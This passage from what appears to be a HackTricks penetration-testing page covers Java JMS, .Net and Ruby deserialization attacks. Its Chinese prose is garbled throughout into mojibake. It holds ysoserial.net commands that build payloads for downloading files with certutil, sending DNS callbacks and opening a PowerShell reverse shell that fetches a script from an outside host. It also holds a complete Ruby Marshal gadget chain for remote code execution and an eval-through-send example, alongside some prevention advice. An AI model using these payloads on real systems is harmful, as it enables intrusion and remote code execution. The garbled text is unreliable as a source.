å› æ­¤ï¼ŒåŸºæœ¬ä¸Šæœ‰**ä¸€å †æœåŠ¡ä»¥å±é™©çš„æ–¹å¼ä½¿ç”¨JMS**ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æœ‰**è¶³å¤Ÿçš„æƒé™**å‘è¿™äº›æœåŠ¡å‘é€æ¶ˆæ¯ï¼ˆé€šå¸¸æ‚¨éœ€è¦æœ‰æ•ˆçš„å‡­æ®ï¼‰ï¼Œæ‚¨å°†èƒ½å¤Ÿå‘é€**æ¶æ„å¯¹è±¡åºåˆ—åŒ–ï¼Œè¿™äº›å¯¹è±¡å°†è¢«æ¶ˆè´¹è€…/è®¢é˜…è€…ååºåˆ—åŒ–**ã€‚\
è¿™æ„å‘³ç€åœ¨æ­¤åˆ©ç”¨ä¸­ï¼Œæ‰€æœ‰**å°†ä½¿ç”¨è¯¥æ¶ˆæ¯çš„å®¢æˆ·ç«¯å°†è¢«æ„ŸæŸ“**ã€‚

æ‚¨åº”è¯¥è®°ä½ï¼Œå³ä½¿æœåŠ¡å­˜åœ¨æ¼æ´ï¼ˆå› ä¸ºå®ƒä¸å®‰å…¨åœ°ååºåˆ—åŒ–ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œæ‚¨ä»ç„¶éœ€è¦æ‰¾åˆ°æœ‰æ•ˆçš„gadgetæ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚

å·¥å…·[JMET](https://github.com/matthiaskaiser/jmet)è¢«åˆ›å»ºç”¨äº**è¿æ¥å’Œæ”»å‡»è¿™äº›æœåŠ¡ï¼Œå‘é€å¤šä¸ªä½¿ç”¨å·²çŸ¥gadgetåºåˆ—åŒ–çš„æ¶æ„å¯¹è±¡**ã€‚è¿™äº›åˆ©ç”¨å°†åœ¨æœåŠ¡ä»ç„¶å­˜åœ¨æ¼æ´ä¸”æ‰€ä½¿ç”¨çš„gadgetåœ¨æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºä¸­æ—¶æœ‰æ•ˆã€‚

### å‚è€ƒæ–‡çŒ®

* JMETè®²åº§ï¼š[https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* å¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

åœ¨.Netçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œååºåˆ—åŒ–åˆ©ç”¨ä»¥ç±»ä¼¼äºJavaçš„æ–¹å¼æ“ä½œï¼Œå…¶ä¸­gadgetè¢«åˆ©ç”¨ä»¥åœ¨ååºåˆ—åŒ–å¯¹è±¡æ—¶è¿è¡Œç‰¹å®šä»£ç ã€‚

### æŒ‡çº¹

#### ç™½ç›’

åº”æ£€æŸ¥æºä»£ç ä¸­æ˜¯å¦å­˜åœ¨ä»¥ä¸‹å†…å®¹ï¼š

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

é‡ç‚¹åº”æ”¾åœ¨å…è®¸é€šè¿‡ç”¨æˆ·æ§åˆ¶çš„å˜é‡ç¡®å®šç±»å‹çš„åºåˆ—åŒ–å™¨ä¸Šã€‚

#### é»‘ç›’

æœç´¢åº”é’ˆå¯¹Base64ç¼–ç å­—ç¬¦ä¸²**AAEAAAD/////**æˆ–ä»»ä½•å¯èƒ½åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œååºåˆ—åŒ–çš„ç±»ä¼¼æ¨¡å¼ï¼Œä»è€Œæ§åˆ¶è¦ååºåˆ—åŒ–çš„ç±»å‹ã€‚è¿™å¯èƒ½åŒ…æ‹¬ä½†ä¸é™äºåŒ…å«`TypeObject`æˆ–`$type`çš„**JSON**æˆ–**XML**ç»“æ„ã€‚

### ysoserial.net

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[**ysoserial.net**](https://github.com/pwntester/ysoserial.net)æ¥**åˆ›å»ºååºåˆ—åŒ–åˆ©ç”¨**ã€‚ä¸‹è½½gitå­˜å‚¨åº“åï¼Œæ‚¨åº”ä½¿ç”¨Visual Studioç­‰ç¼–è¯‘è¯¥å·¥å…·ã€‚

å¦‚æœæ‚¨æƒ³äº†è§£**ysoserial.netæ˜¯å¦‚ä½•åˆ›å»ºå…¶åˆ©ç”¨çš„**ï¼Œæ‚¨å¯ä»¥[**æŸ¥çœ‹æ­¤é¡µé¢ï¼Œå…¶ä¸­è§£é‡Šäº†ObjectDataProvider gadget + ExpandedWrapper + Json.Netæ ¼å¼åŒ–ç¨‹åº**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)ã€‚

**ysoserial.net**çš„ä¸»è¦é€‰é¡¹æœ‰ï¼š**`--gadget`**ã€**`--formatter`**ã€**`--output`**å’Œ**`--plugin`**ã€‚

* **`--gadget`**ç”¨äºæŒ‡ç¤ºè¦æ»¥ç”¨çš„gadgetï¼ˆæŒ‡ç¤ºåœ¨ååºåˆ—åŒ–æœŸé—´å°†è¢«æ»¥ç”¨ä»¥æ‰§è¡Œå‘½ä»¤çš„ç±»/å‡½æ•°ï¼‰ã€‚
* **`--formatter`**ï¼Œç”¨äºæŒ‡ç¤ºåºåˆ—åŒ–åˆ©ç”¨çš„æ–¹æ³•ï¼ˆæ‚¨éœ€è¦çŸ¥é“åç«¯ä½¿ç”¨å“ªä¸ªåº“æ¥ååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶ä½¿ç”¨ç›¸åŒçš„åº“è¿›è¡Œåºåˆ—åŒ–ï¼‰
* **`--output`**ç”¨äºæŒ‡ç¤ºæ‚¨æ˜¯å¦å¸Œæœ›ä»¥**åŸå§‹**æˆ–**base64**ç¼–ç çš„å½¢å¼è·å¾—åˆ©ç”¨ã€‚_è¯·æ³¨æ„ï¼Œ**ysoserial.net**å°†ä½¿ç”¨**UTF-16LE**ï¼ˆWindowsä¸Šé»˜è®¤ä½¿ç”¨çš„ç¼–ç ï¼‰å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œ**ç¼–ç **ï¼Œå› æ­¤å¦‚æœæ‚¨ä»Linuxæ§åˆ¶å°è·å–åŸå§‹æ•°æ®å¹¶ä»…å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸€äº›**ç¼–ç å…¼å®¹æ€§é—®é¢˜**ï¼Œè¿™å°†é˜»æ­¢åˆ©ç”¨æ­£å¸¸å·¥ä½œï¼ˆåœ¨HTB JSONæ¡†ä¸­ï¼Œæœ‰æ•ˆè´Ÿè½½åœ¨UTF-16LEå’ŒASCIIä¸­å‡æœ‰æ•ˆï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€å®ƒæ€»æ˜¯æœ‰æ•ˆï¼‰ã€‚_
* **`--plugin`**ysoserial.netæ”¯æŒæ’ä»¶ä»¥åˆ¶ä½œ**ç‰¹å®šæ¡†æ¶çš„åˆ©ç”¨**ï¼Œå¦‚ViewState

#### æ›´å¤šysoserial.netå‚æ•°

* `--minify`å°†æä¾›ä¸€ä¸ª**æ›´å°çš„æœ‰æ•ˆè´Ÿè½½**ï¼ˆå¦‚æœå¯èƒ½ï¼‰
* `--raf -f Json.Net -c "anything"`è¿™å°†æŒ‡ç¤ºå¯ä»¥ä¸æä¾›çš„æ ¼å¼åŒ–ç¨‹åºï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸º`Json.Net`ï¼‰ä¸€èµ·ä½¿ç”¨çš„æ‰€æœ‰gadget
* `--sf xml`æ‚¨å¯ä»¥**æŒ‡ç¤ºä¸€ä¸ªgadget**ï¼ˆ`-g`ï¼‰ï¼Œysoserial.netå°†æœç´¢åŒ…å«â€œxmlâ€çš„æ ¼å¼åŒ–ç¨‹åºï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰

**ysoserialç¤ºä¾‹**ä»¥åˆ›å»ºåˆ©ç”¨ï¼š
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** è¿˜æœ‰ä¸€ä¸ª **éå¸¸æœ‰è¶£çš„å‚æ•°**ï¼Œå¯ä»¥å¸®åŠ©æ›´å¥½åœ°ç†è§£æ¯ä¸ªæ¼æ´æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼š `--test`\
å¦‚æœæ‚¨æŒ‡å®šæ­¤å‚æ•°ï¼Œ**ysoserial.net** å°† **åœ¨æœ¬åœ°å°è¯•** è¯¥ **æ¼æ´ï¼Œ** è¿™æ ·æ‚¨å°±å¯ä»¥æµ‹è¯•æ‚¨çš„æœ‰æ•ˆè½½è·æ˜¯å¦èƒ½æ­£å¸¸å·¥ä½œã€‚\
è¿™ä¸ªå‚æ•°å¾ˆæœ‰å¸®åŠ©ï¼Œå› ä¸ºå¦‚æœæ‚¨æŸ¥çœ‹ä»£ç ï¼Œæ‚¨ä¼šå‘ç°åƒä»¥ä¸‹ä»£ç å—ï¼ˆæ¥è‡ª [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)ï¼‰ï¼š
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
è¿™æ„å‘³ç€ä¸ºäº†æµ‹è¯•æ¼æ´ï¼Œä»£ç å°†è°ƒç”¨ [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
åœ¨**ä¹‹å‰çš„ä»£ç ä¸­å­˜åœ¨å¯è¢«åˆ©ç”¨çš„æ¼æ´**ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨åœ¨ .Net åº”ç”¨ç¨‹åºä¸­å‘ç°ç±»ä¼¼çš„å†…å®¹ï¼Œè¿™æ„å‘³ç€è¯¥åº”ç”¨ç¨‹åºå¯èƒ½ä¹Ÿå­˜åœ¨æ¼æ´ã€‚\
å› æ­¤ï¼Œ**`--test`** å‚æ•°ä½¿æˆ‘ä»¬èƒ½å¤Ÿäº†è§£**å“ªäº›ä»£ç å—æ˜“å—** **ysoserial.net** åˆ›å»ºçš„ååºåˆ—åŒ–æ¼æ´å½±å“ã€‚

### ViewState

æŸ¥çœ‹[è¿™ç¯‡å…³äº**å¦‚ä½•å°è¯•åˆ©ç”¨ .Net çš„ \_\_ViewState å‚æ•°**](exploiting-\_\_viewstate-parameter.md)æ¥**æ‰§è¡Œä»»æ„ä»£ç ã€‚** å¦‚æœæ‚¨**å·²ç»çŸ¥é“å—å®³è€…æœºå™¨ä½¿ç”¨çš„ç§˜å¯†**ï¼Œ[**é˜…è¯»è¿™ç¯‡æ–‡ç« ä»¥äº†è§£å¦‚ä½•æ‰§è¡Œä»£ç **](exploiting-\_\_viewstate-knowing-the-secret.md)**ã€‚**

### é¢„é˜²

ä¸ºäº†å‡è½»ä¸ .Net ä¸­ååºåˆ—åŒ–ç›¸å…³çš„é£é™©ï¼š

* **é¿å…å…è®¸æ•°æ®æµå®šä¹‰å…¶å¯¹è±¡ç±»å‹ã€‚** å°½å¯èƒ½ä½¿ç”¨ `DataContractSerializer` æˆ– `XmlSerializer`ã€‚
* **å¯¹äº `JSON.Net`ï¼Œå°† `TypeNameHandling` è®¾ç½®ä¸º `None`ï¼š** %%%TypeNameHandling = TypeNameHandling.None%%%
* **é¿å…ä½¿ç”¨å¸¦æœ‰ `JavaScriptTypeResolver` çš„ `JavaScriptSerializer`ã€‚**
* **é™åˆ¶å¯ä»¥è¢«ååºåˆ—åŒ–çš„ç±»å‹ï¼Œ** ç†è§£ .Net ç±»å‹çš„å›ºæœ‰é£é™©ï¼Œä¾‹å¦‚ `System.IO.FileInfo`ï¼Œå®ƒå¯ä»¥ä¿®æ”¹æœåŠ¡å™¨æ–‡ä»¶çš„å±æ€§ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»ã€‚
* **å¯¹å…·æœ‰é£é™©å±æ€§çš„ç±»å‹ä¿æŒè°¨æ…ï¼Œ** å¦‚ `System.ComponentModel.DataAnnotations.ValidationException` åŠå…¶ `Value` å±æ€§ï¼Œå¯èƒ½ä¼šè¢«åˆ©ç”¨ã€‚
* **å®‰å…¨åœ°æ§åˆ¶ç±»å‹å®ä¾‹åŒ–ï¼Œ** ä»¥é˜²æ­¢æ”»å‡»è€…å½±å“ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä½¿å¾—å³ä½¿æ˜¯ `DataContractSerializer` æˆ– `XmlSerializer` ä¹Ÿå˜å¾—è„†å¼±ã€‚
* **ä½¿ç”¨è‡ªå®šä¹‰ `SerializationBinder` ä¸º `BinaryFormatter` å’Œ `JSON.Net` å®æ–½ç™½åå•æ§åˆ¶ã€‚**
* **ä¿æŒå¯¹å·²çŸ¥ä¸å®‰å…¨ååºåˆ—åŒ–å·¥å…·çš„äº†è§£ï¼Œ** ç¡®ä¿ååºåˆ—åŒ–å™¨ä¸å®ä¾‹åŒ–æ­¤ç±»ç±»å‹ã€‚
* **å°†æ½œåœ¨é£é™©ä»£ç ä¸å…·æœ‰äº’è”ç½‘è®¿é—®æƒé™çš„ä»£ç éš”ç¦»ï¼Œ** ä»¥é¿å…å°†å·²çŸ¥å·¥å…·æš´éœ²ç»™ä¸å¯ä¿¡çš„æ•°æ®æºï¼Œä¾‹å¦‚ WPF åº”ç”¨ç¨‹åºä¸­çš„ `System.Windows.Data.ObjectDataProvider`ã€‚

### **å‚è€ƒæ–‡çŒ®**

* Java å’Œ .Net JSON ååºåˆ—åŒ–**è®ºæ–‡ï¼š** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**ï¼Œ** æ¼”è®²ï¼š[https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) å’Œå¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

åœ¨ Ruby ä¸­ï¼Œåºåˆ—åŒ–é€šè¿‡ **marshal** åº“ä¸­çš„ä¸¤ä¸ªæ–¹æ³•æ¥å®ç°ã€‚ç¬¬ä¸€ä¸ªæ–¹æ³•ç§°ä¸º **dump**ï¼Œç”¨äºå°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–ã€‚ç›¸åï¼Œç¬¬äºŒä¸ªæ–¹æ³• **load** ç”¨äºå°†å­—èŠ‚æµè¿˜åŸä¸ºå¯¹è±¡ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºååºåˆ—åŒ–ã€‚

ä¸ºäº†ä¿æŠ¤åºåˆ—åŒ–å¯¹è±¡ï¼Œ**Ruby ä½¿ç”¨ HMACï¼ˆåŸºäºå“ˆå¸Œçš„æ¶ˆæ¯è®¤è¯ç ï¼‰**ï¼Œç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§ã€‚ç”¨äºæ­¤ç›®çš„çš„å¯†é’¥å­˜å‚¨åœ¨å‡ ä¸ªå¯èƒ½çš„ä½ç½®ä¹‹ä¸€ï¼š

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X é€šç”¨ååºåˆ—åŒ–åˆ° RCE gadget é“¾ï¼ˆæ›´å¤šä¿¡æ¯è§** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**ï¼‰ï¼š**
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
å…¶ä»– RCE é“¾ä»¥åˆ©ç”¨ Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() æ–¹æ³•

æ­£å¦‚åœ¨ [**è¿™ä¸ªæ¼æ´æŠ¥å‘Š**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/) ä¸­æ‰€è§£é‡Šçš„ï¼Œå¦‚æœæŸä¸ªç”¨æˆ·æœªç»è¿‡æ»¤çš„è¾“å…¥åˆ°è¾¾ ruby å¯¹è±¡çš„ `.send()` æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å…è®¸ **è°ƒç”¨å¯¹è±¡çš„ä»»ä½•å…¶ä»–æ–¹æ³•**ï¼Œå¹¶ä¼ é€’ä»»ä½•å‚æ•°ã€‚

ä¾‹å¦‚ï¼Œè°ƒç”¨ eval å¹¶å°† ruby ä»£ç ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°å°†å…è®¸æ‰§è¡Œä»»æ„ä»£ç ï¼š

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

æ­¤å¤–ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œå¦‚å‰é¢çš„å†™ä½œä¸­æåˆ°çš„ï¼Œå¯ä»¥è°ƒç”¨å¯¹è±¡çš„ä»»ä½•**ä¸éœ€è¦å‚æ•°**æˆ–å…¶å‚æ•°å…·æœ‰**é»˜è®¤å€¼**çš„æ–¹æ³•ã€‚\
ä¸ºæ­¤ï¼Œå¯ä»¥æšä¸¾å¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•ï¼Œä»¥**æ‰¾åˆ°æ»¡è¶³è¿™äº›è¦æ±‚çš„ä¸€äº›æœ‰è¶£æ–¹æ³•**ã€‚

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
